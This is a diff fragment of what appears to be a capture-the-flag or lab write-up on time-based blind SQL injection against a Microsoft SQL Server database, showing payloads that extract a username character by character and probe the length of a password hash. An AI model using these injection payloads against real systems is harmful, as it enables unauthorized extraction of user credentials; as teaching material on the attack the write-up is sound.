@@ -128,3 +128,11 @@ Finding the username ```butch```.
 '; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 97) WAITFOR DELAY '00:00:05' --
 '; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 98) WAITFOR DELAY '00:00:05' -- and so on
 ```
+
+Guessing the length of the password by the command below.
+
+```SQL
+'; IF (SELECT LEN(password_hash) FROM users) > 10 WAITFOR DELAY '00:00:05' -- and so on
+```
+
+Finally, we know that the password length is 64, so it may have been encrypted.
